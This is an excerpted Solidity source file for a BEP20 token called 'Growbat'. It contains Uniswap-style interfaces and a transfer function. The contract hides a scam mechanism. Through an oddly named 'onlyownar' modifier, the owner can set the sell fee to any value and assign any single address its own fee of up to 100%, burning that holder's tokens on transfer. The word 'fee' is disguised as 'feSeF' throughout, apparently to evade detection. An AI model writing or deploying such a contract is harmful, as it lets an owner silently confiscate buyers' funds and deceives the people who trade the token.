...
interface IUniswapV2Factory {
    ...
    function feSeFTo() external view returns (address);
    function feSeFToSetter() external view returns (address);
    ...
    function setfeSeFTo(address) external;
    function setfeSeFToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeSeFOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeSeFOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeSeFOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeSeFOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeSeFOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Growbat is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeSeF = 0;

    uint256 private _defaultBuyfeSeF = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeSeF;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeSeF = _value;
    }

    function setSlipfeSeF(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeSeF[_address] = _value;
    }

    function getSlipfeSeF(address _address) external view onlyownar returns (uint256) {
        return _slipfeSeF[_address];
    }


    function setMAccountfeSeF(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeSeF(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeSeFAmount = 0;

        if (rF) {
            uint256 tradefeSeF = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeSeF = _defaultSellfeSeF;
                }
                if (from == uniswapV2Pair) {

                    tradefeSeF = _defaultBuyfeSeF;
                }
            }
            if (_slipfeSeF[from] > 0) {
                tradefeSeF = _slipfeSeF[from];
            }

            tradefeSeFAmount = _Amount.mul(tradefeSeF).div(100);
        }


        if (tradefeSeFAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeSeFAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeSeFAmount);
            emit Transfer(from, _deadAddress, tradefeSeFAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeSeFAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeSeFAmount);
        emit Transfer(from, _to, _Amount - tradefeSeFAmount);
    }
